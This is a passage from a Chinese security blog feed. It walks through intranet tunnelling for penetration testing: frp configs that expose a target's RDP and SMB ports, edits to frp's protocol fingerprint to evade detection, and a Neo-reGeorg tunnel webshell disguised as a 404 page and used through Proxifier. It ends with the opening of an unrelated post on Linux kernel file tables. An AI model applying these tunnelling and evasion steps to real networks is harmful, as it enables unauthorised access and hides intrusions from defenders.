<h3 id="Proxifier"><a href="#Proxifier" class="headerlink" title="Proxifier"></a>Proxifier</h3><p> Proxifier是一款功能非常强大的socks5客户端，可以让不支持通过代理服务器工作的网络程序能通过HTTPS或SOCKS代理或代理链。支持 64位系统，支持Xp，Vista，Win7，MAC OS  ,支持socks4，socks5，http代理协议，支持TCP，UDP协议，可以指定端口，指定IP，指定域名，指定程序等运行模式，兼容性非常好。有许多网络应用程序不支持通过代理服务器工作，Proxifier 解决了这些问题和所有限制，让你有机会不受任何限制使用你喜爱的软件。此外，它让你获得了额外的网络安全控制，创建代理隧道，并添加使用更多网络功能的权力。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/01/22/%E6%B8%97%E9%80%8F%E6%89%8B%E6%9C%AD%E4%B9%8B%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/lnetstab.png"
                      alt="lnetstab"
                ></p>
<h1 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h1><p>反向代理的前提就是目标机器出网。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/01/22/%E6%B8%97%E9%80%8F%E6%89%8B%E6%9C%AD%E4%B9%8B%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/reverse_proxy.png"
                      alt="reverse_proxy"
                ></p>
<h2 id="花生壳"><a href="#花生壳" class="headerlink" title="花生壳"></a>花生壳</h2><p>好处是商用，天然免杀，坏处是要直接在目标服务器安装，且这两年收费了。。。就不做介绍了。</p>
<h2 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h2><p>很好用的<strong>开源</strong>反向代理工具，<del>不过容易被杀</del>。我们用上图的拓朴做讲解。下载链接 <a class="link"   href="https://github.com/fatedier/frp%E3%80%82" >https://github.com/fatedier/frp。 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="服务端配置"><a href="#服务端配置" class="headerlink" title="服务端配置"></a>服务端配置</h3><p>服务端可以是我们自己的vps或者有公网ip的服务器，我们这里用ubuntu:20.04为例(ip:192.168.188.133)。服务端程序为frps，frps.toml为配置文件，其内容如下：</p>
<div class="highlight-container" data-rel="Toml"><figure class="iseeu highlight toml"><table><tr><td class="code"><pre><span class="line"><span class="attr">bindPort</span> = <span class="number">7000</span></span><br><span class="line"><span class="comment"># WenUI 端口</span></span><br><span class="line"><span class="attr">webServer.port</span> = <span class="number">7500</span></span><br><span class="line"><span class="comment"># WebUI 的账号密码</span></span><br><span class="line"><span class="attr">webServer.user</span> = <span class="string">&quot;admin&quot;</span></span><br><span class="line"><span class="attr">webServer.password</span> = <span class="string">&quot;admin&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>webServer 可选，开启以后比较方便查看连接进来的机器。</p>
<p>运行命令：</p>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">$ ./frps -c frps.toml</span><br><span class="line">2024/01/22 20:00:35 [I] [root.go:104] frps uses config file: frps.toml</span><br><span class="line">2024/01/22 20:00:35 [I] [service.go:225] frps tcp listen on 0.0.0.0:7000</span><br><span class="line">2024/01/22 20:00:35 [I] [root.go:113] frps started successfully</span><br><span class="line">2024/01/22 20:00:35 [I] [service.go:338] dashboard listen on 127.0.0.1:7500</span><br></pre></td></tr></table></figure></div>

<p>运行成功后访问 <code>http://127.0.0.1:7500</code> 并输入上面设置的账号密码会看到如下界面。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/01/22/%E6%B8%97%E9%80%8F%E6%89%8B%E6%9C%AD%E4%B9%8B%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240122200245663.png"
                      alt="image-20240122200245663"
                ></p>
<h3 id="客户端配置"><a href="#客户端配置" class="headerlink" title="客户端配置"></a>客户端配置</h3><p>“客户端” 就是我们控制的目标机器，我这里以windows server 2008 R2为例(ip:192.168.188.130)。frpc是客户端程序，frpc.toml是配置文件，其内容如下：</p>
<div class="highlight-container" data-rel="Toml"><figure class="iseeu highlight toml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 服务端IP和对应端口</span></span><br><span class="line"><span class="attr">serverAddr</span> = <span class="string">&quot;192.168.188.133&quot;</span></span><br><span class="line"><span class="attr">serverPort</span> = <span class="number">7000</span></span><br><span class="line"></span><br><span class="line"><span class="attr">webServer.port</span> = <span class="number">7500</span></span><br><span class="line"><span class="attr">webServer.user</span> = <span class="string">&quot;admin&quot;</span></span><br><span class="line"><span class="attr">webServer.password</span> = <span class="string">&quot;admin&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="section">[[proxies]]</span></span><br><span class="line"><span class="attr">name</span> = <span class="string">&quot;test-tcp-1&quot;</span></span><br><span class="line"><span class="attr">type</span> = <span class="string">&quot;tcp&quot;</span></span><br><span class="line"><span class="attr">localIP</span> = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line"><span class="attr">localPort</span> = <span class="number">445</span></span><br><span class="line"><span class="attr">remotePort</span> = <span class="number">7001</span></span><br><span class="line"></span><br><span class="line"><span class="section">[[proxies]]</span></span><br><span class="line"><span class="attr">name</span> = <span class="string">&quot;test-tcp-2&quot;</span></span><br><span class="line"><span class="comment"># 连接类型</span></span><br><span class="line"><span class="attr">type</span> = <span class="string">&quot;tcp&quot;</span></span><br><span class="line"><span class="attr">localIP</span> = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line"><span class="comment"># 本地要映射的端口</span></span><br><span class="line"><span class="attr">localPort</span> = <span class="number">3389</span></span><br><span class="line"><span class="comment"># 映射到远程的端口</span></span><br><span class="line"><span class="attr">remotePort</span> = <span class="number">7002</span></span><br></pre></td></tr></table></figure></div>

<p>内容很直观，不再解释。</p>
<p>运行命令：</p>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">&gt; .\frpc.exe -c frpc.toml</span><br><span class="line">2024/01/22 20:08:00 [I] [root.go:141] start frpc service <span class="keyword">for</span> config file [.\frpc.toml]</span><br><span class="line">2024/01/22 20:08:00 [I] [service.go:287] try to connect to server...</span><br><span class="line">2024/01/22 20:08:00 [I] [service.go:279] [1a9b265121ca3fcb] login to server success, get run <span class="built_in">id</span> [1a9b265121ca3fcb]</span><br><span class="line">2024/01/22 20:08:00 [I] [proxy_manager.go:173] [1a9b265121ca3fcb] proxy added: [test-tcp-1 test-tcp-2]</span><br><span class="line">2024/01/22 20:08:00 [I] [service.go:177] admin server listen on 127.0.0.1:7500</span><br><span class="line">2024/01/22 20:08:00 [I] [control.go:169] [1a9b265121ca3fcb] [test-tcp-1] start proxy success</span><br><span class="line">2024/01/22 20:08:00 [I] [control.go:169] [1a9b265121ca3fcb] [test-tcp-2] start proxy success</span><br></pre></td></tr></table></figure></div>

<h3 id="攻击机连接"><a href="#攻击机连接" class="headerlink" title="攻击机连接"></a>攻击机连接</h3><p>我们操控的机器，以kali为例。直接运行 <code>rdesktop 192.168.133:7002</code> 进行远程桌面连接到我们的目标机器。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/01/22/%E6%B8%97%E9%80%8F%E6%89%8B%E6%9C%AD%E4%B9%8B%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240122201523740.png"
                      alt="image-20240122201523740"
                ></p>
<h3 id="特征修改-免杀"><a href="#特征修改-免杀" class="headerlink" title="特征修改(免杀)"></a>特征修改(免杀)</h3><p>有些局域网会进行流量和特征识别，从而进行拦截，可以使用 frp 的流量加密与压缩功能。但自从 frp v0.50开始，已经默认进行tls加密了。frp 连接时，客户端会发起请求到服务端，请求的内容是固定的，包含目标机器的一些信息，信息字段我们可以进行修改，文件在 <code>pkg/msg/msg.go</code> 中。</p>
<div class="highlight-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// When frpc start, client send this message to login to server.</span></span><br><span class="line"><span class="keyword">type</span> Login <span class="keyword">struct</span> &#123;</span><br><span class="line">	Version      <span class="type">string</span>            <span class="string">`json:&quot;version,omitempty&quot;`</span></span><br><span class="line">	Hostname     <span class="type">string</span>            <span class="string">`json:&quot;hostname,omitempty&quot;`</span></span><br><span class="line">	Os           <span class="type">string</span>            <span class="string">`json:&quot;os,omitempty&quot;`</span></span><br><span class="line">	Arch         <span class="type">string</span>            <span class="string">`json:&quot;arch,omitempty&quot;`</span></span><br><span class="line">	User         <span class="type">string</span>            <span class="string">`json:&quot;user,omitempty&quot;`</span></span><br><span class="line">	PrivilegeKey <span class="type">string</span>            <span class="string">`json:&quot;privilege_key,omitempty&quot;`</span></span><br><span class="line">	Timestamp    <span class="type">int64</span>             <span class="string">`json:&quot;timestamp,omitempty&quot;`</span></span><br><span class="line">	RunID        <span class="type">string</span>            <span class="string">`json:&quot;run_id,omitempty&quot;`</span></span><br><span class="line">	Metas        <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span> <span class="string">`json:&quot;metas,omitempty&quot;`</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Currently only effective for VirtualClient.</span></span><br><span class="line">	ClientSpec ClientSpec <span class="string">`json:&quot;client_spec,omitempty&quot;`</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Some global configures.</span></span><br><span class="line">	PoolCount <span class="type">int</span> <span class="string">`json:&quot;pool_count,omitempty&quot;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<hr>
<p>frp 为了端口复用，建立 TLS 连接时第一个字节固定为 <code>0x17</code>，且后面数据包大小为 317。代码位置在 <code>pkg/util/net/tls.go</code>，其信息也可以修改，可以把第一个字符改为其他16进制。</p>
<div class="highlight-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> net</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;crypto/tls&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;net&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line"></span><br><span class="line">	libnet <span class="string">&quot;github.com/fatedier/golib/net&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> FRPTLSHeadByte = <span class="number">0x17</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">CheckAndEnableTLSServerConnWithTimeout</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	c net.Conn, tlsConfig *tls.Config, tlsOnly <span class="type">bool</span>, timeout time.Duration,</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span> (out net.Conn, isTLS <span class="type">bool</span>, custom <span class="type">bool</span>, err <span class="type">error</span>) &#123;</span><br><span class="line">	sc, r := libnet.NewSharedConnSize(c, <span class="number">2</span>)</span><br><span class="line">	buf := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">1</span>)</span><br><span class="line">	<span class="keyword">var</span> n <span class="type">int</span></span><br><span class="line">	_ = c.SetReadDeadline(time.Now().Add(timeout))</span><br><span class="line">	n, err = r.Read(buf)</span><br><span class="line">	_ = c.SetReadDeadline(time.Time&#123;&#125;)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> &#123;</span><br><span class="line">	<span class="keyword">case</span> n == <span class="number">1</span> &amp;&amp; <span class="type">int</span>(buf[<span class="number">0</span>]) == FRPTLSHeadByte:</span><br><span class="line">		out = tls.Server(c, tlsConfig)</span><br><span class="line">		isTLS = <span class="literal">true</span></span><br><span class="line">		custom = <span class="literal">true</span></span><br><span class="line">	<span class="keyword">case</span> n == <span class="number">1</span> &amp;&amp; <span class="type">int</span>(buf[<span class="number">0</span>]) == <span class="number">0x16</span>:</span><br><span class="line">		out = tls.Server(sc, tlsConfig)</span><br><span class="line">		isTLS = <span class="literal">true</span></span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">if</span> tlsOnly &#123;</span><br><span class="line">			err = fmt.Errorf(<span class="string">&quot;non-TLS connection received on a TlsOnly server&quot;</span>)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		out = sc</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h1><p>如果目标机器不出网的情况下，可以使用正向代理。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/01/22/%E6%B8%97%E9%80%8F%E6%89%8B%E6%9C%AD%E4%B9%8B%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/proxy.png"
                      alt="proxy"
                ></p>
<h2 id="Neo-reGeorg-Proxifier"><a href="#Neo-reGeorg-Proxifier" class="headerlink" title="Neo-reGeorg+Proxifier"></a>Neo-reGeorg+Proxifier</h2><p>由于reGeorg年久失修且不支持加密，所以就不介绍了。正向代理很简单无需配置什么，并且脚本是挂在http&#x2F;https服务的，一般不会被查杀，但也需要防止静态查杀，加一些代码，做一些混淆。这里介绍几个常用伪装命令。</p>
<h3 id="伪装与上传"><a href="#伪装与上传" class="headerlink" title="伪装与上传"></a>伪装与上传</h3><p>我们可以把 www目录下的<code>error</code>，文件夹复制出来，用于做伪装。</p>
<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; python3 .\neoreg.py generate <span class="literal">-k</span> <span class="number">123456</span> <span class="operator">-f</span> error/<span class="number">404</span>.html <span class="literal">-c</span> <span class="number">404</span></span><br><span class="line">          <span class="string">&quot;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&#x27;&#x27;  &#x27;M<span class="variable">$</span>  &#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>@m</span></span><br><span class="line"><span class="string">        :<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&#x27;&#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&#x27;</span></span><br><span class="line"><span class="string">       &#x27;<span class="variable">$</span>&#x27;    &#x27;JZI&#x27;<span class="variable">$</span><span class="variable">$</span>&amp;  <span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&#x27;</span></span><br><span class="line"><span class="string">                 &#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>  &#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span></span></span><br><span class="line"><span class="string">                 <span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>  J<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&#x27;</span></span><br><span class="line"><span class="string">                m<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>  <span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>,</span></span><br><span class="line"><span class="string">                <span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>@  &#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$_</span>          Neo-reGeorg</span></span><br><span class="line"><span class="string">             &#x27;1t<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&#x27; &#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&lt;</span></span><br><span class="line"><span class="string">          &#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&#x27;  <span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>          version 5.2.0</span></span><br><span class="line"><span class="string">               &#x27;@<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&#x27;  <span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&#x27;</span></span><br><span class="line"><span class="string">                &#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>  &#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>@</span></span><br><span class="line"><span class="string">             &#x27;z<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>  @<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span></span></span><br><span class="line"><span class="string">                r<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>   <span class="variable">$</span><span class="variable">$</span>|</span></span><br><span class="line"><span class="string">                &#x27;<span class="variable">$</span><span class="variable">$v</span> c<span class="variable">$</span><span class="variable">$</span></span></span><br><span class="line"><span class="string">               &#x27;<span class="variable">$</span><span class="variable">$v</span> <span class="variable">$</span><span class="variable">$v</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>#</span></span><br><span class="line"><span class="string">               <span class="variable">$</span><span class="variable">$x</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$twelve</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>@<span class="variable">$</span>&#x27;</span></span><br><span class="line"><span class="string">             @<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>@L &#x27;    &#x27;&lt;@<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>`</span></span><br><span class="line"><span class="string">           <span class="variable">$</span><span class="variable">$</span>                 &#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    [ Github ] https://github.com/L-codes/Neo-reGeorg</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    [+] Create neoreg server files:</span></span><br><span class="line"><span class="string">       =&gt; neoreg_servers/tunnel.ashx</span></span><br><span class="line"><span class="string">       =&gt; neoreg_servers/tunnel.aspx</span></span><br><span class="line"><span class="string">       =&gt; neoreg_servers/tunnel.go</span></span><br><span class="line"><span class="string">       =&gt; neoreg_servers/tunnel.jsp</span></span><br><span class="line"><span class="string">       =&gt; neoreg_servers/tunnel.jspx</span></span><br><span class="line"><span class="string">       =&gt; neoreg_servers/tunnel.php</span></span><br></pre></td></tr></table></figure></div>

<p>-k 指定密钥，-f 指定伪装文件，-c 指定<code>httpcode</code>，然后把生成的tunnel文件改个名，传到代理服务器中。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/01/22/%E6%B8%97%E9%80%8F%E6%89%8B%E6%9C%AD%E4%B9%8B%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240123182522130.png"
                      alt="image-20240123182522130"
                ></p>
<h3 id="配置Proxifier"><a href="#配置Proxifier" class="headerlink" title="配置Proxifier"></a>配置Proxifier</h3><p>运行Neo-reGorg，因为我们把网站伪装成了 404，所以需要加<code>--skip</code>。</p>
<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; python3 .\neoreg.py <span class="literal">-k</span> <span class="number">123456</span> <span class="literal">-u</span> http://<span class="number">192.168</span>.<span class="number">188.133</span>/tunnel.php <span class="literal">-p</span> <span class="number">10086</span> <span class="literal">--skip</span></span><br><span class="line">          <span class="string">&quot;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&#x27;&#x27;  &#x27;M<span class="variable">$</span>  &#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>@m</span></span><br><span class="line"><span class="string">        :<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&#x27;&#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&#x27;</span></span><br><span class="line"><span class="string">       &#x27;<span class="variable">$</span>&#x27;    &#x27;JZI&#x27;<span class="variable">$</span><span class="variable">$</span>&amp;  <span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&#x27;</span></span><br><span class="line"><span class="string">                 &#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>  &#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span></span></span><br><span class="line"><span class="string">                 <span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>  J<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&#x27;</span></span><br><span class="line"><span class="string">                m<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>  <span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>,</span></span><br><span class="line"><span class="string">                <span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>@  &#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$_</span>          Neo-reGeorg</span></span><br><span class="line"><span class="string">             &#x27;1t<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&#x27; &#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&lt;</span></span><br><span class="line"><span class="string">          &#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&#x27;  <span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>          version 5.2.0</span></span><br><span class="line"><span class="string">               &#x27;@<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&#x27;  <span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&#x27;</span></span><br><span class="line"><span class="string">                &#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>  &#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>@</span></span><br><span class="line"><span class="string">             &#x27;z<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>  @<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span></span></span><br><span class="line"><span class="string">                r<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>   <span class="variable">$</span><span class="variable">$</span>|</span></span><br><span class="line"><span class="string">                &#x27;<span class="variable">$</span><span class="variable">$v</span> c<span class="variable">$</span><span class="variable">$</span></span></span><br><span class="line"><span class="string">               &#x27;<span class="variable">$</span><span class="variable">$v</span> <span class="variable">$</span><span class="variable">$v</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>#</span></span><br><span class="line"><span class="string">               <span class="variable">$</span><span class="variable">$x</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$twelve</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>@<span class="variable">$</span>&#x27;</span></span><br><span class="line"><span class="string">             @<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>@L &#x27;    &#x27;&lt;@<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>`</span></span><br><span class="line"><span class="string">           <span class="variable">$</span><span class="variable">$</span>                 &#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    [ Github ] https://github.com/L-codes/Neo-reGeorg</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">+------------------------------------------------------------------------+</span></span><br><span class="line"><span class="string">  Log Level set to [ERROR]</span></span><br><span class="line"><span class="string">  Starting SOCKS5 server [127.0.0.1:10086]</span></span><br><span class="line"><span class="string">  Tunnel at:</span></span><br><span class="line"><span class="string">    http://192.168.188.133/tunnel.php</span></span><br><span class="line"><span class="string">+------------------------------------------------------------------------+</span></span><br></pre></td></tr></table></figure></div>

<p>接下来打开 Proxifier。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/01/22/%E6%B8%97%E9%80%8F%E6%89%8B%E6%9C%AD%E4%B9%8B%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240123182900644.png"
                      alt="image-20240123182900644"
                ></p>
<p>如上图配置后，添加规则打开要代理的程序。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/01/22/%E6%B8%97%E9%80%8F%E6%89%8B%E6%9C%AD%E4%B9%8B%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240123183033094.png"
                      alt="image-20240123183033094"
                ></p>
<p><code>Action</code> 选择代理。然后即可通过代理访问内网。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/01/22/%E6%B8%97%E9%80%8F%E6%89%8B%E6%9C%AD%E4%B9%8B%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240123183221998.png"
                      alt="image-20240123183221998"
                ></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>内网隧道代理</tag>
      </tags>
  </entry>
  <entry>
    <title>浅析Linux内核之文件与IO</title>
    <url>/2024/01/22/%E6%B5%85%E6%9E%90Linux%E5%86%85%E6%A0%B8%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8EIO/</url>
    <content><![CDATA[<h1 id="内核文件表"><a href="#内核文件表" class="headerlink" title="内核文件表"></a>内核文件表</h1><p><strong>文件</strong></p>
<p>Linux内核将一切视为文件，既可以是事实上的真正的物理文件，也可以是设备、管道，甚至还可以是一块内存。狭义的文件是指文件系统中的物理文件，而广义的文件则可以是Linux管理的所有对象。这些广义的文件利用<code>VFS</code>机制，以文件系统的形式挂载在Linux内核中，对外提供一致的文件操作接口。</p>
<p><strong>文件描述符</strong></p>
<p>文件描述符是一个非负整数，其本质就是一个句柄，所以也可以认为文件描述符就是一个文件句柄。一切对于用户透明的返回值，即可视为句柄。用户空间利用文件描述符与内核进行交互；而内核拿到文件描述符后，可以通过它得到用于管理文件的真正的数据结构。</p>
<p><strong>文件表</strong></p>
<p>Linux的每个进程都会维护一个文件表，以便维护该进程打开文件的信息，包括打开的文件个数、每个打开文件的偏移量等信息。</p>
<h2 id="文件表的实现"><a href="#文件表的实现" class="headerlink" title="文件表的实现"></a>文件表的实现</h2><p>内核中进程对应的结构是<code>task_struct</code>，进程的文件表保存在<code>task_struct-&gt;files</code>中。其结构代码如下所示。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fdtable</span> &#123;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> max_fds;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> __<span class="title">rcu</span> **<span class="title">fd</span>;</span>      <span class="comment">/* current fd array */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> *close_on_exec;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> *open_fds;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> *full_fds_bits;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">files_struct</span> &#123;</span></span><br><span class="line">    <span class="comment">/* count为文件表files_struct的引用计数*/</span></span><br><span class="line">    <span class="type">atomic_t</span> count;</span><br><span class="line">    <span class="comment">/* 文件描述符表*/</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    *  为什么有两个fdtable呢？这是内核的一种优化策略。fdt为指针，而fdtab为普通变量。</span></span><br><span class="line"><span class="comment">    *  一般情况下，fdt是指向fdtab的，当需要它的时候，才会真正动态申请内存。</span></span><br><span class="line"><span class="comment">    *  因为默认大小的文件表足以应付大多数情况，因此这样就可以避免频繁的内存申请。</span></span><br><span class="line"><span class="comment">	*  这也是内核的常用技巧之一。在创建时，使用普通的变量或者数组，然后让指针指向它，作为默认情况使用。</span></span><br><span class="line"><span class="comment">	*  只有当进程使用量超过默认值时，才会动态申请内存。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fdtable</span> __<span 